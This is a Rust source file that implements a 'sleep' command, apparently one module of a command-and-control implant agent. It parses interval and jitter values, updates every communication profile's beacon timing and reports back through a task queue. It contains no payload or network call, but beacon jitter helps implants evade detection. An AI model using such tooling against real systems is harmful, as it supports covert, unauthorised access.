use crate::profiles;
use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct SleepArgs {
    #[serde(default = "default_neg")]
    interval: i32,
    #[serde(default = "default_neg")]
    jitter: i32,
}

fn default_neg() -> i32 { -1 }

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: SleepArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let mut output = String::new();
    if args.interval >= 0 {
        output.push_str(&profiles::update_all_sleep_interval(args.interval));
    }
    if args.jitter >= 0 {
        output.push_str(&profiles::update_all_sleep_jitter(args.jitter));
    }
    response.user_output = output;
    response.completed = true;

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
